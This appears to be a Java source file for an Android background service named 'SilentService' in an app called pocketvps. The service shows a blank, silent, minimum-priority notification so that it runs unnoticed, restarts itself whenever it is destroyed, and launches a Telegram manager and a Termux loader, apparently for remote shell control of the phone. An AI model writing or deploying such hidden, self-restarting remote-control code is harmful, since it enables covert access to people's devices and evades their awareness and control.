package com.rx.pocketvps;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

public class SilentService extends Service {
    private static final String CHANNEL_ID = "rx_bg";
    private static final int    NOTIF_ID   = 1;

    private TelegramManager telegramManager;
    private TermuxLoader    termuxLoader;

    @Override
    public void onCreate() {
        super.onCreate();
        startSilentForeground();

        new Thread(() -> {
            termuxLoader = new TermuxLoader(getApplicationContext());
            termuxLoader.initialize();
        }).start();

        telegramManager = new TelegramManager(this);
        telegramManager.start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (telegramManager != null) telegramManager.stop();
        Intent restart = new Intent(getApplicationContext(), SilentService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart);
        } else {
            startService(restart);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void startSilentForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, " ",
                NotificationManager.IMPORTANCE_MIN
            );
            ch.setShowBadge(false);
            ch.setSound(null, null);
            ch.enableLights(false);
            ch.enableVibration(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }

        Notification notif;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notif = new Notification.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
                .setContentTitle("")
                .setContentText("")
                .build();
        } else {
            notif = new Notification.Builder(this)
                .setPriority(Notification.PRIORITY_MIN)
                .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
                .build();
        }
        // Foreground rehne do - band mat karo
        startForeground(NOTIF_ID, notif);
    }

    public TermuxLoader getTermuxLoader() { return termuxLoader; }
}
